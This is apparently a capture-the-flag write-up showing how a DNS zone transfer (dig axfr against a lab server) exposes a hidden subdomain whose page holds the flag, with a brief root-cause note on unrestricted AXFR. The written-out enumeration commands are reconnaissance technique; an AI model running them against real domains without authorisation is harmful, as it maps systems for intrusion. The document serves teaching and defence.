## Write-Up

### Objective

Obtain the full list of DNS records for the domain via Zone Transfer (AXFR) and find a hidden subdomain containing the flag.

### Solution

1. Check for DNS zone transfer (AXFR) availability for the domain company.ru:

```bash
dig axfr company.ru @172.30.0.2
```

2. Among the retrieved subdomains, find the interesting one:

```
sup3rs3cret.company.ru
```

3. Query the discovered subdomain:

```bash
curl http://sup3rs3cret.company.ru
```

The flag is returned in the response.

### Root Cause

The DNS server allows zone transfers to any client. Zone transfer should only be permitted to authorized servers.